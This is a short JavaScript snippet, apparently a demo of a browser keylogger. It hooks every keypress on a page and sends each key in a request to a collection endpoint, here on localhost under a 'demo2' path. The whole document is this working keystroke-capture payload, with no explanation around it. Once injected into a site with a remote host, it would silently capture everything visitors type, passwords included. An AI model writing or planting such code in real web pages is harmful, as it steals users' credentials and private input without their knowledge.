document.onkeypress = function(e) {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://localhost/demo2/keystroke?key=' + e.key, true);
    xhr.send();
};